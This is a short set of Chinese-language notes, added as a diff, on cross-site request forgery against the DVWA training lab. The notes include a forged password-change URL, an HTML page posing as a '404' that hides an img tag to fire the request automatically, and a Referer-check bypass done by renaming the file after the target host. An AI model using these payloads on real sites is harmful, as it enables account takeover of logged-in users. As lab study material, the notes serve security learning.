@@ -1,0 +1,17 @@
+csrf原理:
+https://blog.csdn.net/qq_36119192/article/details/81429250
+https://blog.csdn.net/yaofeino1/article/details/54667698
+https://www.freebuf.com/articles/web/118352.html
+
+目标必须首先登陆过一次，获取到了cookie，才可以。且密码为黑客所知的默认密码。
+low:
+.1:         http://172.16.169.19/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=admin&Change=Change#       ##直连接容易被察觉
+.2:  vim csrf_test.html
+       <img src="http://192.168.197.136/dvwa/vulnerabilities/csrf/?password_new=111111&password_conf=111111&Change=Change#" border="0" style="display:none;"/>
+        <h1>404<h1>
+        <h2>file not found.<h2>
+###构造以一个页面，诱骗点击。[加载页面时自动加载img标签的图片，自动访问。]
+
+medium:
+想要通过验证，就必须保证在http请求中Referer字段中必须包含Host，所以我们只需要把我们的文件名改成他的Host的name就可以完美的通过验证。
+mv   csrf_test.html      1.1.1.1.html     ##1.1.1.1为host;1.1.1.1为目标为受害站点的ip。==172.16.169.19
